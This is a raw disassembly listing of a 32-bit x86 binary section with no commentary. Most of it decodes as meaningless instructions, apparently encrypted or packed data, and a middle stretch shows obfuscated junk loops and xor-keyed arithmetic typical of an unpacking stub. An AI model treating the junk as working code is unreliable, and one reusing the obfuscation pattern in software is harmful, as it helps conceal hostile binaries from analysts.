  40a609:	xor    dh,bl
  40a60b:	sbb    al,0x20
  40a60d:	adc    DWORD PTR [edi-0x96728d0],esi
  40a613:	or     cl,bh
  40a615:	neg    ebp
  40a617:	(bad)  
  40a618:	ins    DWORD PTR es:[edi],dx
  40a619:	fst    DWORD PTR [edi-0x4c3a7273]
  40a61f:	test   DWORD PTR [ebp-0x6d],esp
  40a622:	sbb    al,0xc1
  40a624:	pop    ebx
  40a625:	mov    WORD PTR [ebp+ebx*8-0x6fd39692],ds
  40a62c:	xchg   ebp,eax
  40a62d:	mov    ds:0x3a9cc25e,eax
  40a632:	push   0xb3781f20
  40a637:	mov    ah,0x9
  40a639:	lods   al,BYTE PTR ds:[esi]
  40a63a:	addr16 mov bl,0x68
  40a63d:	mov    edi,0xabf0c91a
  40a642:	xchg   ebx,eax
  40a643:	rcl    DWORD PTR [eax+0x3f],0xb2
  40a647:	pop    edx
  40a648:	push   esp
  40a649:	aad    0xfa
  40a64b:	adc    esp,esp
  40a64d:	push   esi
  40a64e:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40a650:	add    edi,ebx
  40a652:	enter  0xe01e,0xd6
  40a656:	mov    esp,0xa8c3ca50
  40a65b:	je     0x40a614
  40a65d:	mov    ah,0xd8
  40a65f:	adc    DWORD PTR [edi-0x5],edi
  40a662:	xor    edx,DWORD PTR [esi+0x6891d381]
  40a668:	jl     0x40a655
  40a66a:	aad    0x46
  40a66c:	push   0x1fb44b4f
  40a671:	js     0x40a6a8
  40a673:	mov    cl,0x55
  40a675:	mov    ch,0x2
  40a677:	inc    esp
  40a678:	sub    BYTE PTR [esi-0x62a971b9],bl
  40a67e:	sar    BYTE PTR [esi],1
  40a680:	add    eax,esi
  40a682:	fild   QWORD PTR [edi+eiz*8]
  40a685:	dec    edx
  40a686:	mov    WORD PTR [ebp-0x4c],ss
  40a689:	xchg   DWORD PTR [esi+edx*1-0x7c],eax
  40a68d:	pop    ebp
  40a68e:	push   eax
  40a68f:	sti    
  40a690:	ja     0x40a654
  40a692:	pushf  
  40a693:	cmp    bl,al
  40a695:	pop    eax
  40a696:	mov    al,0xb7
  40a699:	jns    0x40a717
  40a69b:	lea    ecx,[esi]
  40a69d:	icebp  
  40a69e:	sbb    BYTE PTR [ecx+0x3de82859],0xcc
  40a6a5:	outs   dx,DWORD PTR ds:[esi]
  40a6a6:	inc    ecx
  40a6a7:	mov    esp,fs
  40a6a9:	lea    eax,[ebx+0x6]
  40a6ac:	xchg   edx,esp
  40a6ae:	imul   edx,DWORD PTR [edi+0x73d958ed],0xffffffdf
  40a6b5:	dec    ebp
  40a6b6:	xchg   DWORD PTR [edi-0x9abd7ad],ebx
  40a6bc:	cld    
  40a6bd:	or     DWORD PTR ds:0x4ff25716,0x30f002a8
  40a6c7:	mov    ecx,0x766bd50
  40a6cc:	repz (bad) 
  40a6cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6d0:	sub    BYTE PTR [ebx+0x48],ch
  40a6d3:	addr16 mov ebx,0x438ff3f9
  40a6d9:	mov    BYTE PTR [ebx-0xd7471ba],ah
  40a6df:	pop    ss
  40a6e0:	lock pop es
  40a6e2:	and    al,0xf0
  40a6e4:	xchg   edi,eax
  40a6e5:	neg    dl
  40a6e7:	rol    BYTE PTR [esp+eax*4+0x7dbc9f5c],1
  40a6ee:	rol    dl,1
  40a6f0:	mov    ch,0xc8
  40a6f2:	dec    edi
  40a6f3:	xlat   BYTE PTR ds:[ebx]
  40a6f4:	jmp    0x62168828
  40a6f9:	cmp    BYTE PTR [ecx-0x48],cl
  40a6fc:	mov    al,ds:0x7d018d4
  40a701:	mov    eax,ds:0xabc01a7f
  40a706:	retf   0xd459
  40a709:	dec    ecx
  40a70a:	jmp    0xd52d:0x5660cc59
  40a711:	loopne 0x40a6d2
  40a713:	sti    
  40a714:	xor    bh,ch
  40a716:	enter  0x668c,0x7b
  40a71a:	lods   eax,DWORD PTR ds:[esi]
  40a71b:	pusha  
  40a71c:	mov    DWORD PTR [esi],edx
  40a71e:	cmp    dl,bh
  40a720:	in     al,0xef
  40a722:	sub    edx,ecx
  40a724:	sbb    al,0xbd
  40a726:	pop    ss
  40a727:	outs   dx,DWORD PTR ds:[esi]
  40a728:	lock and eax,0x66c9aeaf
  40a72e:	dec    ebx
  40a72f:	pushf  
  40a730:	pop    esi
  40a731:	or     ecx,DWORD PTR [ebp+0x9]
  40a734:	xor    al,0xd2
  40a736:	mov    edi,0x2c24bb31
  40a73b:	jb     0x40a7af
  40a73d:	leave  
  40a73e:	fwait
  40a73f:	xor    BYTE PTR [edx-0x59],dl
  40a742:	cs mov ah,0xe8
  40a745:	jmp    0x40a77e
  40a747:	leave  
  40a748:	les    esi,FWORD PTR [ecx]
  40a74a:	popf   
  40a74b:	fcom   QWORD PTR [ecx-0x57]
  40a74e:	xor    BYTE PTR [ebx+0x7ad2921],bl
  40a754:	push   edx
  40a755:	pushf  
  40a756:	xchg   BYTE PTR [ebx+0x515a4411],ch
  40a75c:	sub    BYTE PTR ds:0x6b15980a,cl
  40a762:	loopne 0x40a7b0
  40a764:	loope  0x40a778
  40a766:	and    ebx,ebp
  40a768:	inc    edx
  40a769:	repz sbb BYTE PTR ds:0xe65b3443,cl
  40a770:	inc    esp
  40a771:	mov    cl,al
  40a773:	shl    DWORD PTR [edi],1
  40a775:	mov    ecx,0x2836ad54
  40a77a:	mov    edi,DWORD PTR [esi+0x19]
  40a77d:	mov    esp,0x86fbb65e
  40a782:	add    al,0xc6
  40a784:	inc    eax
  40a785:	push   esi
  40a786:	or     BYTE PTR [eax-0x27],bh
  40a789:	mov    eax,ds:0xe957532b
  40a78e:	mov    bl,0x1
  40a790:	add    BYTE PTR [eax],al
  40a792:	mov    ah,0x79
  40a794:	jae    0x40a807
  40a796:	jno    0x40a809
  40a798:	mov    dl,0x39
  40a79a:	hlt    
  40a79b:	or     ebp,DWORD PTR [edx+ebp*2-0x45]
  40a79f:	aas    
  40a7a0:	loop   0x40a7fa
  40a7a2:	ja     0x40a793
  40a7a4:	jo     0x40a816
  40a7a6:	xchg   ebp,eax
  40a7a7:	jg     0x40a819
  40a7a9:	jo     0x40a782
  40a7ab:	out    dx,al
  40a7ac:	aas    
  40a7ad:	xchg   esi,eax
  40a7ae:	jne    0x40a7f4
  40a7b0:	cmp    al,BYTE PTR [ebx+0x9]
  40a7b3:	jno    0x40a7a0
  40a7b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7b6:	fisub  WORD PTR [edx-0x3d21d7d9]
  40a7bc:	fs mov edx,0x411ed89e
  40a7c2:	in     eax,dx
  40a7c3:	retf   
  40a7c4:	cs mov dh,BYTE PTR cs:[edx+0x6e9f07d3]
  40a7cc:	xchg   ecx,eax
  40a7cd:	jnp    0x40a758
  40a7cf:	jne    0x40a802
  40a7d1:	push   ecx
  40a7d2:	pop    esp
  40a7d3:	mov    cl,0x58
  40a7d5:	(bad)  
  40a7d6:	call   0x1047:0xd0c5bf88
  40a7dd:	mov    cl,0xcc
  40a7df:	sub    dl,dh
  40a7e1:	cdq    
  40a7e2:	or     eax,0xb75243ab
  40a7e7:	ja     0x40a831
  40a7e9:	sahf   
  40a7ea:	xor    al,0xfc
  40a7ec:	mov    esi,0x753a65f0
  40a7f1:	add    ebx,DWORD PTR cs:0x12d9178c
  40a7f8:	sbb    eax,esi
  40a7fa:	int3   
  40a7fb:	retf   0xa69
  40a7fe:	or     BYTE PTR [edx-0x1d],cl
  40a801:	lds    ebp,FWORD PTR [edi+eax*2]
  40a804:	ds and ah,ch
  40a807:	call   0x4811a84
  40a80c:	test   BYTE PTR [eax],0x40
  40a80f:	inc    esp
  40a810:	sub    BYTE PTR [esi],dh
  40a812:	ss in  eax,dx
  40a814:	loope  0x40a7c0
  40a816:	xchg   ebx,eax
  40a817:	shl    ah,1
  40a819:	and    al,0xcd
  40a81b:	add    al,0xda
  40a81d:	dec    ebx
  40a81e:	and    cl,BYTE PTR [eax-0x12]
  40a821:	in     al,dx
  40a822:	dec    eax
  40a823:	inc    edx
  40a824:	aam    0x45
  40a826:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a827:	jecxz  0x40a824
  40a829:	repnz xchg ah,ch
  40a82c:	int3   
  40a82d:	xor    edx,DWORD PTR [esi+ebp*1-0x2483756]
  40a834:	aad    0xbe
  40a836:	add    dl,BYTE PTR [edx]
  40a838:	aas    
  40a839:	sbb    DWORD PTR [ecx-0x5c],ebp
  40a83c:	mov    eax,0x66163dd2
  40a841:	jg     0x40a8a3
  40a843:	aaa    
  40a844:	adc    DWORD PTR [edx+0xc],eax
  40a847:	mul    BYTE PTR [eax-0x13]
  40a84a:	and    ebp,DWORD PTR [ebp+0x58]
  40a84d:	iret   
  40a84e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a84f:	mov    esi,0x2576008c
  40a854:	popf   
  40a855:	in     eax,dx
  40a856:	sar    DWORD PTR [edi+0x2e],0xef
  40a85a:	jae    0x40a867
  40a85c:	pop    esp
  40a85d:	mov    cl,0x8
  40a85f:	ins    BYTE PTR es:[edi],dx
  40a860:	sbb    BYTE PTR ds:0x1dab1896,bh
  40a866:	mov    al,BYTE PTR [ebx-0x5a3b311b]
  40a86c:	pop    edx
  40a86d:	out    0x95,eax
  40a86f:	jae    0x40a880
  40a871:	mov    bh,BYTE PTR [edx-0x7f]
  40a874:	push   0xffffffc8
  40a876:	outs   dx,BYTE PTR ds:[esi]
  40a877:	jo     0x40a810
  40a879:	in     al,dx
  40a87a:	mov    ch,0xa9
  40a87c:	fild   WORD PTR [ebx]
  40a87e:	std    
  40a87f:	in     eax,dx
  40a880:	push   ds
  40a881:	repnz push cs
  40a883:	lea    ebx,[edx-0x1a]
  40a886:	mov    dl,0xa2
  40a888:	fsubrp st(1),st
  40a88a:	int3   
  40a88b:	mov    cl,0x91
  40a88d:	jle    0x40a8f9
  40a88f:	data16 add bl,ch
  40a892:	clc    
  40a893:	cmp    al,0xd4
  40a895:	ror    BYTE PTR [edi],cl
  40a897:	lahf   
  40a898:	mov    WORD PTR [ecx-0x515f5bb6],gs
  40a89e:	dec    ebx
  40a89f:	not    edx
  40a8a1:	mov    dh,0xd7
  40a8a3:	ror    DWORD PTR [ebp+0x5f],0x6e
  40a8a7:	jnp    0x40a886
  40a8a9:	out    0xf1,al
  40a8ab:	push   0x5d
  40a8ad:	dec    esp
  40a8ae:	mov    eax,ds:0x1309de6
  40a8b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8b4:	xlat   BYTE PTR ds:[ebx]
  40a8b5:	jb     0x40a894
  40a8b7:	or     ecx,DWORD PTR [eax]
  40a8b9:	(bad)  
  40a8ba:	cmp    BYTE PTR [ebx-0x27dafc9f],cl
  40a8c0:	mov    ch,0x48
  40a8c2:	add    eax,0x8ce61265
  40a8c7:	jmp    0x40a861
  40a8c9:	xchg   ecx,eax
  40a8ca:	mov    eax,ds:0xa9739fc2
  40a8cf:	inc    edi
  40a8d0:	(bad)  
  40a8d1:	push   ebx
  40a8d2:	xchg   edx,eax
  40a8d3:	ret    
  40a8d4:	mov    ds:0xd0431ef7,eax
  40a8d9:	xor    DWORD PTR [esi+0x50fbf88e],0xffffffff
  40a8e0:	test   DWORD PTR [ecx+edx*4],esi
  40a8e3:	cmc    
  40a8e4:	sbb    bh,dl
  40a8e6:	mov    edx,0x974dc82b
  40a8eb:	pop    es
  40a8ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8ed:	jecxz  0x40a8fc
  40a8ef:	cld    
  40a8f0:	call   0xa216eac3
  40a8f5:	addr16 add bh,al
  40a8f8:	rol    BYTE PTR [ebx],0xe4
  40a8fb:	sti    
  40a8fc:	cs sub esp,DWORD PTR gs:[edi-0x2c]
  40a901:	scas   al,BYTE PTR es:[edi]
  40a902:	add    DWORD PTR [edx],edi
  40a904:	pop    es
  40a905:	jle    0x40a921
  40a907:	test   eax,0xd499a06f
  40a90c:	stos   DWORD PTR es:[edi],eax
  40a90d:	sub    esi,DWORD PTR [esi+ebx*4-0x29]
  40a911:	test   eax,0xf000e58e
  40a916:	loop   0x40a926
  40a918:	adc    eax,ebx
  40a91a:	inc    edx
  40a91b:	adc    DWORD PTR [eax+ebp*4],0xb57f1740
  40a922:	mov    al,BYTE PTR [ebx+0x31]
  40a925:	js     0x40a8b9
  40a927:	sbb    BYTE PTR [esi+0x33ad607],cl
  40a92d:	arpl   WORD PTR [edi+0x65ef7e2c],si
  40a933:	icebp  
  40a934:	xchg   ecx,eax
  40a935:	pop    es
  40a936:	jmp    FWORD PTR [ebx]
  40a938:	inc    eax
  40a939:	out    0xc,eax
  40a93b:	or     al,ch
  40a93d:	test   al,0x26
  40a93f:	jecxz  0x40a91d
  40a941:	les    edx,FWORD PTR [ebp-0x6340906c]
  40a947:	jb     0x40a97b
  40a949:	add    BYTE PTR [ebx],dl
  40a94b:	sbb    eax,0x432708
  40a950:	add    eax,edi
  40a952:	sbb    DWORD PTR ds:0x432de2,edi
  40a958:	mov    DWORD PTR [ecx],eax
  40a95a:	not    DWORD PTR ds:0x434421
  40a960:	lea    eax,[ebp-0x4]
  40a963:	xor    DWORD PTR ds:0x432de2,ecx
  40a969:	mov    DWORD PTR [ebp-0x10],eax
  40a96c:	mov    eax,DWORD PTR [ebp+0x8]
  40a96f:	add    DWORD PTR ds:0x432dca,edx
  40a975:	mov    ecx,DWORD PTR [ebp-0x10]
  40a978:	xor    eax,esi
  40a97a:	and    DWORD PTR ds:0x4326fc,0x0
  40a984:	jmp    0x40a996
  40a989:	mov    ebx,DWORD PTR ds:0x4326fc
  40a98f:	inc    ebx
  40a990:	mov    DWORD PTR ds:0x4326fc,ebx
  40a996:	cmp    DWORD PTR ds:0x4326fc,0x1a
  40a99d:	jae    0x40a9da
  40a9a3:	cmp    DWORD PTR ds:0x4326fc,0x8
  40a9aa:	jne    0x40a9bb
  40a9b0:	push   0x184e
  40a9b5:	call   DWORD PTR ds:0x432d12
  40a9bb:	cmp    DWORD PTR ds:0x4326fc,0x7
  40a9c2:	jne    0x40a9d5
  40a9c8:	mov    ebx,DWORD PTR ds:0x4326fc
  40a9ce:	inc    ebx
  40a9cf:	mov    DWORD PTR ds:0x4326fc,ebx
  40a9d5:	jmp    0x40a989
  40a9da:	add    eax,edi
  40a9dc:	mov    DWORD PTR [ecx],eax
  40a9de:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40a9e5:	lea    eax,[ebp-0x18]
  40a9e8:	and    DWORD PTR ds:0x4326f8,0x0
  40a9f2:	jmp    0x40aa04
  40a9f7:	mov    ecx,DWORD PTR ds:0x4326f8
  40a9fd:	inc    ecx
  40a9fe:	mov    DWORD PTR ds:0x4326f8,ecx
  40aa04:	cmp    DWORD PTR ds:0x4326f8,0x16
  40aa0b:	jae    0x40aa5e
  40aa11:	cmp    DWORD PTR ds:0x4326f8,0x4
  40aa18:	jne    0x40aa39
  40aa1e:	push   0x5697
  40aa23:	push   DWORD PTR [ebp-0xc]
  40aa26:	push   0x541e
  40aa2b:	push   0x8aca
  40aa30:	push   DWORD PTR [ebp-0x24]
  40aa33:	call   DWORD PTR ds:0x432c62
  40aa39:	cmp    DWORD PTR ds:0x4326f8,0x3
  40aa40:	jne    0x40aa53
  40aa46:	mov    ecx,DWORD PTR ds:0x4326f8
  40aa4c:	inc    ecx
  40aa4d:	mov    DWORD PTR ds:0x4326f8,ecx
  40aa53:	jmp    0x40a9f7
  40aa58:	and    DWORD PTR ds:0x434376,ecx
  40aa5e:	mov    DWORD PTR [ebp-0x24],eax
  40aa61:	and    DWORD PTR ds:0x43437e,0x0
  40aa6b:	jmp    0x40aa7f
  40aa70:	xor    ecx,ecx
  40aa72:	add    ecx,DWORD PTR ds:0x43437e
  40aa78:	inc    ecx
  40aa79:	mov    DWORD PTR ds:0x43437e,ecx
  40aa7f:	cmp    DWORD PTR ds:0x43437e,0x18
  40aa86:	jae    0x40aab3
  40aa8c:	cmp    DWORD PTR ds:0x43437e,0x20
  40aa93:	jne    0x40aaae
  40aa99:	push   0x6696
  40aa9e:	push   0x74e3
  40aaa3:	push   0x43275d
  40aaa8:	call   DWORD PTR ds:0x432d16
  40aaae:	jmp    0x40aa70
  40aab3:	mov    eax,DWORD PTR [ebp-0x18]
  40aab6:	add    DWORD PTR ds:0x43436e,0x336
  40aac0:	mov    ecx,DWORD PTR [ebp-0x24]
  40aac3:	sub    DWORD PTR ds:0x4343a2,ebx
  40aac9:	xor    eax,esi
  40aacb:	add    DWORD PTR ds:0x432dc6,ebx
  40aad1:	add    eax,edi
  40aad3:	neg    ebx
  40aad5:	mov    DWORD PTR [ecx],eax
  40aad7:	mov    eax,ds:0x416274
  40aadc:	movzx  ebx,WORD PTR ds:0x434392
  40aae3:	sbb    DWORD PTR ds:0x4326ec,ebx
  40aae9:	mov    ebx,0x8e12febe
  40aaee:	mov    DWORD PTR ds:0x434419,0x7eb1
  40aaf8:	mov    DWORD PTR [ebp-0xc],ebx
  40aafb:	mov    eax,DWORD PTR [eax]
  40aafd:	or     DWORD PTR ds:0x432de2,0x3ff6
  40ab07:	mov    cx,WORD PTR [ebp-0x4]
  40ab0b:	add    DWORD PTR ds:0x434392,0x7366
  40ab15:	movzx  ecx,cx
  40ab18:	add    ecx,DWORD PTR [eax]
  40ab1a:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40ab21:	mov    DWORD PTR [ebp-0x1c],ecx
  40ab24:	jmp    0x40acdc
  40ab29:	jbe    0x40ab3f
  40ab2b:	dec    eax
  40ab2c:	sahf   
  40ab2d:	jb     0x40ab89
  40ab2f:	jbe    0x40ab05
  40ab31:	xor    eax,0x827cbad5
  40ab36:	sub    eax,0xed8c8a90
  40ab3b:	jo     0x40abad
  40ab3d:	xchg   ebp,eax
  40ab3e:	jg     0x40abb0
  40ab40:	jo     0x40ab4b
  40ab42:	fisubr WORD PTR [ebx+0x5d]
  40ab45:	pop    esp
  40ab46:	mov    DWORD PTR [ebp+0x4a],ebp
  40ab49:	aad    0xbb
  40ab4b:	mov    ds:0xb124c81e,al
  40ab50:	mov    al,0xa5
  40ab52:	ins    DWORD PTR es:[edi],dx
  40ab53:	xor    al,BYTE PTR [ecx-0x3e]
  40ab56:	fwait
  40ab57:	dec    edi
  40ab58:	cmp    al,0xf0
  40ab5a:	xor    DWORD PTR [esi-0x75],esp
  40ab5d:	(bad)  
  40ab5e:	cmp    DWORD PTR [edx-0x6a49ba68],ecx
  40ab64:	retf   0x3cda
  40ab67:	stos   BYTE PTR es:[edi],al
  40ab68:	mov    edi,0xda31efde
  40ab6d:	sahf   
  40ab6e:	ficom  DWORD PTR [esi-0x2558ee2d]
  40ab74:	push   edi
  40ab75:	inc    ebx
  40ab76:	(bad)  
  40ab77:	jg     0x40abbb
  40ab79:	cwde   
  40ab7a:	xchg   edi,eax
  40ab7b:	push   ds
  40ab7c:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40ab7e:	std    
  40ab7f:	xchg   DWORD PTR [ecx+0x2760fbbb],edx
  40ab85:	imul   edi,esi,0x29
  40ab88:	jo     0x40abe7
  40ab8a:	or     al,0x4
  40ab8c:	shl    DWORD PTR [edi],1
  40ab8e:	pop    edi
  40ab8f:	sub    eax,0xe5dffd50
  40ab94:	out    dx,eax
  40ab95:	sbb    ebp,DWORD PTR [edi+0x76]
  40ab98:	adc    eax,0xb128799e
  40ab9d:	shl    DWORD PTR [esi+0xe237e35],cl
  40aba3:	nop
  40aba4:	cld    
  40aba5:	jge    0x40ac26
  40aba7:	cmp    BYTE PTR [edx],dh
  40aba9:	or     BYTE PTR [esi-0x22484f5d],dh
  40abaf:	das    
  40abb0:	and    BYTE PTR [ecx],dh
  40abb2:	cmc    
  40abb3:	stos   BYTE PTR es:[edi],al
  40abb4:	(bad)  
  40abb5:	and    edx,DWORD PTR [edi-0x5d]
  40abb8:	lock dec esp
  40abba:	sbb    DWORD PTR [ecx-0x3c36cf6f],ebx
  40abc0:	in     eax,0x87
  40abc2:	ins    DWORD PTR es:[edi],dx
  40abc3:	pop    ebx
  40abc4:	mov    dh,0x47
  40abc6:	sbb    ebx,ebx
  40abc8:	pop    ss
  40abc9:	rol    BYTE PTR [ebp+0x72],1
  40abcc:	out    dx,al
  40abcd:	push   ecx
  40abce:	pop    DWORD PTR [esi]
  40abd0:	cld    
  40abd1:	add    edi,ecx
  40abd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40abd4:	stc    
  40abd5:	xchg   ecx,eax
  40abd6:	hlt    
  40abd7:	jns    0x40abbf
  40abd9:	add    cl,bl
  40abdb:	jae    0x40ab7e
  40abdd:	cmp    al,0xe5
  40abdf:	xchg   edx,eax
  40abe0:	push   0xc870566f
  40abe5:	pop    esi
  40abe6:	pop    edi
  40abe7:	pusha  
  40abe8:	mov    esp,0xf1ee51a2
  40abed:	(bad)  
  40abee:	in     eax,dx
  40abef:	aam    0x74
  40abf1:	cwde   
  40abf2:	fcom   DWORD PTR [ebp+0x26]
  40abf5:	and    eax,0xfb5079b6
  40abfa:	rcr    DWORD PTR [edi],1
  40abfc:	mov    bh,0xaa
  40abfe:	inc    ebp
  40abff:	pop    edi
  40ac00:	cld    
  40ac01:	push   esi
  40ac02:	jle    0x40ab8f
  40ac04:	xchg   ebp,eax
  40ac05:	call   0x9808:0x4522a592
  40ac0c:	call   FWORD PTR [edi+0x8]
  40ac0f:	mov    ch,0x41
  40ac11:	jl     0x40abf2
  40ac13:	inc    ebp
  40ac14:	test   DWORD PTR [esi+0x72e577b5],esp
  40ac1a:	shl    BYTE PTR [eax+0x476d164],1
  40ac20:	dec    ebp
  40ac21:	leave  
  40ac22:	jmp    0x2f55:0x5dadd663
  40ac29:	xchg   esp,eax
  40ac2a:	sbb    eax,0x83431123
  40ac2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac30:	inc    ebx
  40ac31:	cdq    
  40ac32:	sbb    al,0xee
  40ac34:	adc    esp,DWORD PTR [ebx+0x7233e051]
  40ac3a:	daa    
  40ac3b:	test   al,0x76
  40ac3d:	arpl   WORD PTR ds:0x1d0fcfdb,sp
  40ac43:	push   ss
  40ac44:	push   0xffffffe5
  40ac46:	out    0x38,eax
  40ac48:	jbe    0x40abe6
  40ac4a:	sub    DWORD PTR [edi-0x11],ecx
  40ac4d:	xor    bl,BYTE PTR [eax-0x56]
  40ac50:	out    dx,al
  40ac51:	jg     0x40ac5c
  40ac53:	gs pop esi
  40ac55:	sti    
  40ac56:	sar    dl,0x55
  40ac59:	inc    ecx
  40ac5a:	add    bh,BYTE PTR [ebp+0x77]
  40ac5d:	mov    dh,0xc6
  40ac5f:	mov    bl,0xa0
  40ac61:	xor    cl,ah
  40ac63:	jl     0x40ac5c
  40ac65:	push   edi
  40ac66:	adc    al,BYTE PTR [ecx+0x3b7c36fd]
  40ac6c:	shl    ecx,1
  40ac6e:	dec    ebp
  40ac6f:	sbb    DWORD PTR [ebx],0x22
  40ac72:	adc    bl,0x43
  40ac75:	adc    eax,0x11174496
  40ac7a:	ret    0x415f
  40ac7d:	push   0x6e
  40ac7f:	pop    es
  40ac80:	aam    0x4f
  40ac82:	neg    BYTE PTR [edi]
  40ac84:	dec    DWORD PTR [edi+0xbdd91da]
  40ac8a:	push   eax
  40ac8b:	mov    BYTE PTR [ebx],bl
  40ac8d:	iret   
  40ac8e:	xlat   BYTE PTR ds:[ebx]
  40ac8f:	in     eax,0xde
  40ac91:	cmp    bh,BYTE PTR [edx]
  40ac93:	xor    al,0xf1
  40ac95:	ret    0xcdc
  40ac98:	dec    ebx
  40ac99:	call   0xd5f88deb
  40ac9e:	add    DWORD PTR [esi+0x5af56f29],ebp
  40aca4:	call   0xb6812c13
  40aca9:	inc    ebx
  40acaa:	sbb    ecx,DWORD PTR [ebx-0x60]
  40acad:	xchg   BYTE PTR [ebx-0x1aca0a27],ah
  40acb3:	adc    eax,0x669cfb72
  40acb8:	(bad)  
  40acb9:	outs   dx,DWORD PTR ds:[esi]
  40acba:	jo     0x40ad18
  40acbc:	mov    DWORD PTR [ecx],ebx
  40acbe:	jne    0x40ac53
  40acc0:	out    dx,eax
  40acc1:	add    BYTE PTR [ebp-0x48],dl
  40acc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40acc5:	mov    BYTE PTR [ebp-0x792870aa],ah
  40accb:	mov    esp,0x26d2217a
  40acd0:	push   0x364ccb76
  40acd5:	push   0x4b
  40acd7:	shl    DWORD PTR [edi+edx*8],cl
  40acda:	pop    es
  40acdb:	or     BYTE PTR [ebx+0x4d8b0845],0xf8
  40ace2:	xor    eax,esi
  40ace4:	add    eax,edi
  40ace6:	cmp    DWORD PTR [ecx],eax
  40ace8:	jne    0x40af2d
  40acee:	mov    eax,DWORD PTR [ebp+0x8]
  40acf1:	mov    ecx,DWORD PTR [ebp-0x1c]
  40acf4:	xor    eax,esi
  40acf6:	add    eax,edi
  40acf8:	cmp    DWORD PTR [ecx],eax
  40acfa:	jne    0x40ad1d
  40ad00:	mov    eax,DWORD PTR [ebp+0x8]
  40ad03:	mov    ecx,DWORD PTR [ebp-0x10]
  40ad06:	xor    eax,esi
  40ad08:	add    eax,edi
  40ad0a:	mov    DWORD PTR [ecx],eax
  40ad0c:	mov    eax,DWORD PTR [ebp-0x10]
  40ad0f:	mov    ecx,DWORD PTR [ebp-0x14]
  40ad12:	xor    ecx,esi
  40ad14:	mov    edx,0xffcd8d64
  40ad19:	sub    edx,ecx
  40ad1b:	add    DWORD PTR [eax],edx
  40ad1d:	mov    eax,ds:0x416274
  40ad22:	mov    eax,DWORD PTR [eax]
  40ad24:	mov    cx,WORD PTR [ebp-0x4]
  40ad28:	movzx  ecx,cx
  40ad2b:	add    ecx,DWORD PTR [eax]
  40ad2d:	mov    DWORD PTR [ebp-0x1c],ecx
  40ad30:	mov    eax,DWORD PTR [ebp+0xc]
  40ad33:	jmp    0x40aeeb
  40ad38:	and    ecx,ecx
  40ad3a:	repnz call 0x5305:0x5171a1f2
  40ad42:	inc    esi
  40ad43:	std    
  40ad44:	mov    ds:0x216d7366,eax
  40ad49:	jmp    0x40adbb
  40ad4b:	jo     0x40ace2
  40ad4d:	jg     0x40adbf
  40ad4f:	jo     0x40ad3f
  40ad51:	and    al,0xbf
  40ad53:	(bad)  
  40ad55:	dec    eax
  40ad56:	lock mov ah,0x29
  40ad59:	aad    0x63
  40ad5b:	and    dl,BYTE PTR [eax]
  40ad5d:	jge    0x40acec
  40ad5f:	inc    edi
  40ad60:	ds dec ecx
  40ad62:	or     bh,BYTE PTR [esi-0x41]
  40ad65:	cdq    
  40ad66:	(bad)  
  40ad67:	out    dx,al
  40ad68:	(bad)  
  40ad69:	mov    ds:0xf3e5834a,al
  40ad6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad6f:	pop    ecx
  40ad70:	mov    edx,0x1a6190c8
  40ad75:	pop    edx
  40ad76:	jg     0x40ad63
  40ad78:	fidivr DWORD PTR [edi]
  40ad7a:	sub    eax,0x8d26ec51
  40ad7f:	ror    BYTE PTR [ecx+0x5633bfda],1
  40ad85:	xor    DWORD PTR [ecx-0x78],edi
  40ad88:	xchg   ecx,eax
  40ad89:	or     eax,0xbbd91e9f
  40ad8e:	cmp    ah,al
  40ad90:	fcmovne st,st(5)
  40ad92:	mov    ebx,0x2e821125
  40ad97:	push   ss
  40ad98:	xchg   esi,eax
  40ad99:	test   DWORD PTR [edi],ebx
  40ad9b:	xor    BYTE PTR ds:0x33ae8f9,ch
  40ada1:	sbb    DWORD PTR [ebx-0x7e],eax
  40ada4:	in     eax,0x2d
  40ada6:	aas    
  40ada7:	jno    0x40ae05
  40ada9:	pop    ds
  40adaa:	fwait
  40adab:	sahf   
  40adac:	add    al,0xb7
  40adae:	mov    cs,esi
  40adb0:	jp     0x40ad45
  40adb2:	jns    0x40ae22
  40adb4:	ret    0x7881
  40adb7:	mov    esp,0xb45afca1
  40adbc:	xor    eax,0x455a807f
  40adc1:	or     eax,0x604f0cc
  40adc6:	dec    esi
  40adc7:	std    
  40adc8:	loope  0x40adb2
  40adca:	inc    edx
  40adcb:	xchg   ecx,eax
  40adcc:	mov    dh,0x87
  40adce:	mov    dh,0x72
  40add0:	cmp    eax,0xf694aaa0
  40add5:	pop    ebp
  40add6:	xor    bl,cl
  40add8:	dec    ebp
  40add9:	clc    
  40adda:	sub    DWORD PTR [edi+0x47],esi
  40addd:	lahf   
  40adde:	jae    0x40ae01
  40ade0:	pop    ds
  40ade1:	in     eax,dx
  40ade2:	shl    dl,0x66
  40ade5:	mov    ebp,0x944e1302
  40adea:	adc    DWORD PTR [eax+0x43e350f1],ecx
  40adf0:	push   eax
  40adf1:	sub    al,0x5f
  40adf3:	push   esi
  40adf4:	cdq    
  40adf5:	xlat   BYTE PTR ds:[ebx]
  40adf6:	in     eax,dx
  40adf7:	jle    0x40ad7a
  40adf9:	aam    0x5c
  40adfb:	jno    0x40ae3b
  40adfd:	xchg   ebx,eax
  40adfe:	mov    al,0xf0
  40ae00:	mov    esi,0x404fc70c
  40ae05:	pop    edx
  40ae06:	push   ss
  40ae07:	fwait
  40ae08:	jp     0x40ae1d
  40ae0a:	test   DWORD PTR [ebx+0x7a3b8594],eax
  40ae10:	stos   BYTE PTR es:[edi],al
  40ae11:	bound  edi,QWORD PTR [edi-0x7b]
  40ae14:	call   FWORD PTR [esi]
  40ae16:	popf   
  40ae17:	push   ss
  40ae18:	mov    esi,0xe7172cf7
  40ae1d:	outs   dx,BYTE PTR ds:[esi]
  40ae1e:	push   0x6f
  40ae20:	jae    0x40ada9
